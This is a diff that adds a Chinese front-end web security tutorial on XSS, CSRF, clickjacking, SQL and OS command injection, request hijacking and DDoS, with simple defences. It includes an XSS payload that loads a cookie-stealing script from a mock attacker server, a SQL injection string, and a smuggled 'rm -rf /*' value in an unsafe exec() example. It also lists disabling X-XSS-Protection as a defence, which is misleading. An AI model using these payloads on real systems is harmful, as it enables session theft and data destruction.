@@ -1,0 +1,224 @@
+# 网络安全
+
+> 前端不需要过硬的网络安全方面的知识,但是能够了解大多数的网络安全,并且可以进行简单的防御前两三个是需要的
+
+**介绍一下常见的安全问题,解决方式,和小的Demo,希望大家喜欢**
+
+## 网络安全汇总
+
+* XSS
+
+* CSRF
+* 点击劫持
+* SQL注入
+* OS注入
+* 请求劫持
+* DDOS
+
+**在我看来,前端可以了解并且防御前4个就可以了(小声逼逼:大佬当我没说)**
+
+## XSS
+
+Cross Site Scripting 又叫做跨站脚本攻击,本身应该叫做CSS,但是由于CSS被占用,无奈下叫做XSS
+
+### what is XSS?
+
+我们先从字面意义上看一下,跨站->顾名思义就是我们从一个网站跑到了另外一个网站上,脚本->也就是我们往页面中写了脚本内容,可以理解为写了js代码,那么最后我们对网站造成了攻击
+
+例如: 我们在登录了一个网站之后,一般都会把登录状态保存在cookie中,当我们去访问另外一个网站的时候,就会读取到cookie
+
+### XSS危害
+
+* 利⽤虚假输⼊表单骗取⽤户个⼈信息。
+
+* 利⽤脚本窃取⽤户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
+
+* 显示伪造的⽂章或图⽚。
+
+### 简单演示
+
+```js
+// 普通
+http://localhost:3000/?from=china
+// alert尝试
+http://localhost:3000/?from=<script>alert(3)</script>
+// 如果可以弹出3,证明这个输入框没有过滤html标记
+```
+
+模拟获取cookie
+
+```js
+http://localhost:3000/?from=<script src="http://localhost:4000/hack.js">
+```
+
+后台代码
+
+``` js
+const koa = require('koa');  //启动在4000端口上
+const chalk = require('chalk')
+const log = contents => {
+    console.log(chalk.red(contents)) //打印cookie
+}
+
+// 模拟黑客网站
+const app = new koa();
+
+module.exports = app
+```
+
+### 防御措施
+
+1. 设置HEAD
+```js
+ctx.set('X-XSS-Protection', 0) // 禁⽌XSS过滤
+```
+
+2. 设置HttpOnly Cookie
+这是预防XSS攻击窃取⽤户cookie最有效的防御⼿段。Web应 ⽤程序在设置cookie时，将其属性设为HttpOnly，就可以避免该⽹⻚的cookie被客户端恶意JavaScript窃取，保护⽤户cookie信息。
+
+```js
+response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly")
+```
+
+3. CSP
+内容安全策略 (CSP, Content Security Policy) 是⼀个附加的安全层，⽤于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注⼊等攻击。 这些攻击可⽤于实现从数据窃取到⽹站破坏或作为恶意软件分发版本等⽤途。
+CSP 本质上就是建⽴⽩名单，开发者明确告诉浏览器哪些外部资源可以加载和执⾏。我们只需要配置规则，如何拦截是由浏览器⾃⼰实现的。我们可以通过这种⽅式来尽量减少
+XSS 攻击。
+
+## CSRF
+
+CSRF(Cross Site Request Forgery)，即跨站请求伪造，是⼀种常⻅的Web攻击，它利⽤⽤户已登录的身份，在⽤户毫不知情的情况下，以⽤户的名义完成⾮法操作。
+
+### what is CSRF?
+
+还是从字面上去分析,跨站还是指从一个网站指向另外一个网站,于XSS不用的是,他是请求,指我们在别的网站上发出一个请求,而这个请求是伪造出来的
+
+* ⽤户已经登录了站点 A，并在本地记录了 cookie
+
+* 在⽤户没有登出站点 A 的情况下（也就是 cookie ⽣效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。
+* 站点 A 没有做任何 CSRF 防御
+
+### CSRF危害
+
+* 利⽤⽤户登录态
+
+* ⽤户不知情
+* 完成业务请求
+* 盗取⽤户资⾦（转账，消费）
+* 冒充⽤户发帖背锅
+* 损害⽹站声誉
+
+### 防御CSRF
+
+* 禁⽌第三⽅⽹站带Cookie - 有兼容性问题
+
+* Referer Check - Https不发送referer
+* 验证码
+
+## 点击劫持
+
+点击劫持是⼀种视觉欺骗的攻击⼿段。攻击者将需要攻击的⽹站通过 iframe 嵌套的⽅式嵌⼊⾃⼰的⽹⻚中，并将 iframe 设置为透明，在⻚⾯中透出⼀个按钮诱导⽤户点击。
+
+### what is 点击劫持?
+
+点击劫持说白了就是诱导用户点击,下面放一张图片,估计就都了解了
+<img src="https://cdn.jsdelivr.net/gh/2662419405/imgPlus/Snipaste_2020-01-19_23-53-26.png" />
+
+### 如何防御点击劫持
+
+X-FRAME-OPTIONS
+X-FRAME-OPTIONS 是⼀个 HTTP 响应头，在现代浏览器有⼀个很好的⽀持。这个 HTTP 响应头就是为了防御⽤ iframe 嵌套的点击劫持攻击。
+
+```js
+ctx.set('X-FRAME-OPTIONS', 'DENY')
+```
+
+JS方式
+
+```html
+<head>
+ <style id="click-jack">
+ html {
+ display: none !important;
+ }
+ </style>
+</head>
+<body>
+ <script>
+ if (self == top) {
+ var style = document.getElementById('click-jack')
+ document.body.removeChild(style)
+ } else {
+ top.location = self.location
+ }
+ </script>
+</body>
+```
+
+## SQL注入
+
+sql是我们学习数据库的一种语言,而注入就代表是从前端对数据库下手
+
+### what is sql注入?
+
+下面这段代码可以看出来,当我们进行字符串拼接(拼接sql语句的时候),会出现一种类似于管道符的bug, 1|0,那么这句话为恒为真
+
+```js
+// 填⼊特殊密码
+1'or'1'='1
+// 拼接后的SQL
+SELECT *
+FROM test.user
+WHERE username = 'laowang'
+AND password = '1'or'1'='1'
+```
+
+### 防御措施
+
+其实防御起来很简单,每个语言都提供了不同的方式,但是原理就是**不进行字符串拼接,而是用占位符**
+
+* 严格限制Web应⽤的数据库的操作权限**，给此⽤户提供仅仅能够满⾜其⼯作的最低权限，从⽽最⼤限度的减少注⼊攻击对数据库的危害
+
+* 对进⼊数据库的特殊字符（'，"，\，<，>，&，*，; 等）进⾏转义处理，或编码转换**。基本上所有的后端语⾔都有对字符串进⾏转义处理的⽅法，⽐如 lodash 的 lodash._escapehtmlchar库。
+
+* 后端代码检查输⼊的数据是否符合预期**，严格限制变量的类型，例如使⽤正则表达式进⾏⼀些匹配处理。
+
+### 后几个我没学过防御,前端萌新
+
+## OS命令注入
+
+OS命令注⼊和SQL注⼊差不多，只不过SQL注⼊是针对数据库的，⽽OS命令注⼊是针对操作系统的。OS命令注⼊攻击指通过Web应⽤，执⾏⾮法的操作系统命令达到攻击的⽬的。只要在能调⽤Shell函数的地⽅就有存在被攻击的⻛险。倘若调⽤Shell时存在疏漏，就可以执⾏插⼊的⾮法命令。
+
+```js
+// 以 Node.js 为例，假如在接⼝中需要从 github 下载⽤户指定的 repo
+const exec = require('mz/child_process').exec;
+let params = {/* ⽤户输⼊的参数 */};
+exec(`git clone ${params.repo} /some/path`);
+```
+
+如果参数是
+
+```js
+https://github.com/xx/xx.git && rm -rf /* &&
+```
+
+## 请求劫持
+
+* DNS劫持
+顾名思义，DNS服务器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不是预期的ip
+
+* HTTP劫持 运营商劫持，此时⼤概只能升级HTTPS了
+
+## DDOS
+
+distributed denial of service 分布式系统攻击
+
+### what is DDOS?
+
+> DDOS 不是⼀种攻击，⽽是⼀⼤类攻击的总称。它有⼏⼗种类型，新的攻击⽅法还在不断发明出来。⽹站运⾏的各个环节，都可以是攻击⽬标。只要把⼀个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的⽬的。
+
+其中，⽐较常⻅的⼀种攻击是 cc 攻击。它就是简单粗暴地送来⼤量正常的请求，超出服务器的最⼤承受量，导致宕机。我遭遇的就是 cc 攻击，最多的时候全世界⼤概20多个 IP 地址轮流发出请求，每个地址的请求量在每秒200次~300次。我看访问⽇志的时候，就觉得那些请求像洪⽔⼀样涌来，⼀眨眼就是⼀⼤堆，⼏分钟的时间，⽇志⽂件的体积就⼤了100MB。说实话，这只能算⼩攻击，但是我的个⼈⽹站没有任何防护，服务器还是跟其他⼈共享的，这种流量⼀来⽴刻就下线了。
+
+### 如何防御
+
+说白了**花钱解决**
